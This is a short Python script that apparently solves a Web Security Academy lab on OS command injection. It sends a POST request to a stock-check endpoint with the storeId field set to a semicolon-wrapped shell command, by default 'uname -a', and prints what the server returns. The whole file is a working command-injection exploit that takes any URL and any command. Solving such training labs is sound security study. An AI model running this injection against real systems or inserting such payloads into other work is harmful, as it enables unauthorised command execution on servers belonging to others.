# usage:
# python3 1.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net
# --c "uname -a"

from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str, command: str) -> None:
        self.url = url.rstrip("/")
        self.command = command

    def solve(self) -> None:
        self.s = requests.Session()
        r = self.s.post(
            f"{self.url}/product/stock",
            data={"productId": "1", "storeId": f"; {self.command} ;"},
        )
        print(r.text)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--c", "--command", dest="command")
    args = parser.parse_args()
    s = Solution(args.url, args.command)
    s.solve()


if __name__ == "__main__":
    main()
